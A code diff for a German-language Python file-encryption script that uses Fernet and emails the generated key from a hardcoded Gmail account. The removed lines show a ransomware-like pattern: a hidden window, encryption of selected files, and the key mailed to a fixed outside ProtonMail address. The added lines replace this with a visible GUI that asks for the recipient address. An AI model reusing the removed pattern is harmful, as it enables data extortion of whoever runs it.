@@ -1,5 +1,4 @@
 import os
-import subprocess
 import smtplib
 import ssl
 from cryptography.fernet import Fernet
@@ -9,22 +8,11 @@ from google.oauth2 import service_account
 from google.auth.transport.requests import Request
 import tkinter as tk
 from tkinter import filedialog
+
 icon_path = "decrypt_ico.ico"
 
-import sys
-if getattr(sys, 'frozen', False):
-    # Wenn das Skript ausgeführt wird als eine eingefrorene (ausführbare) Datei (EXE)
-    # Setze das Arbeitsverzeichnis auf den Verzeichnispfad der EXE-Datei
-    os.chdir(sys._MEIPASS)
-
-
-script_dir = os.path.dirname(os.path.abspath(__file__))
-json_file_path = os.path.join(script_dir, "pyhock-8efe0c1bdb0f.json")
-
-
-def send_key(key):
+def send_key(key, receiver_email):
     sender_email = "pyhock000@gmail.com"
-    receiver_email = "pyhock@proton.me"
     subject = "Verschlüsselungsschlüssel"
     message = f"Hier ist der generierte Schlüssel: {key.decode()}"
 
@@ -67,15 +55,63 @@ def encrypt_file(file_path, cipher_suite):
 def encrypt_files(key):
     cipher_suite = Fernet(key)
 
-    root = tk.Tk()
-    root.withdraw()
+    def select_file():
+        root.filename = filedialog.askopenfilename()
+        entry_path.delete(0, tk.END)
+        entry_path.insert(0, root.filename)
 
-    file_paths = filedialog.askopenfilenames()
-    for file_path in file_paths:
-        encrypt_file(file_path, cipher_suite)
+    root = tk.Tk()
+    root.title("Datei-Verschlüsselung")
+    root.geometry("400x200")
+    root.resizable(False, False)  # Fenstergröße nicht änderbar
+    root.overrideredirect(False)  # Standard-Titelleiste des Fensters anzeigen
+
+    label_email = tk.Label(root, text="E-Mail-Adresse für den Schlüsselversand:")
+    label_email.pack(pady=5)
+
+    entry_email = tk.Entry(root, width=50)
+    entry_email.pack(pady=5)
+
+    label_instructions = tk.Label(root, text="Dateipfad für Verschlüsselung:")
+    label_instructions.pack(pady=5)
+
+    entry_path = tk.Entry(root, width=50)
+    entry_path.pack(pady=5)
+
+    button_explore = tk.Button(root, text="...", command=select_file)
+    button_explore.pack(side=tk.RIGHT, padx=10, pady=5)
+
+    def encrypt_and_send():
+        file_path = entry_path.get()
+        email = entry_email.get()
+        if file_path and email:
+            encrypt_file(file_path, cipher_suite)
+            send_key(key, email)
+            root.quit()  # Schließe das Tkinter-Fenster, nachdem die Datei verschlüsselt und der Schlüssel versendet wurde
+
+    button_encrypt = tk.Button(root, text="Verschlüsseln und Schlüssel senden", command=encrypt_and_send)
+    button_encrypt.pack(pady=10)
+
+    x = y = 0
+
+    def move_window(event):
+        root.geometry(f"+{event.x_root - x}+{event.y_root - y}")
+
+    def on_left_click(event):
+        nonlocal x, y
+        x, y = event.x, event.y
+
+    label_instructions.bind("<ButtonPress-1>", on_left_click)
+    label_instructions.bind("<B1-Motion>", move_window)
+
+    root.mainloop()
 
 if __name__ == "__main__":
+    # Erstelle ein Dummy-Fenster, um das Tkinter-Fenster zu verstecken
+    hide_root = tk.Tk()
+    hide_root.attributes("-alpha", 0.0)  # Fenster unsichtbar machen
+    hide_root.withdraw()  # Fenster verstecken
+
     key = generate_key()
-    send_key(key)
     encrypt_files(key)
     print(key)
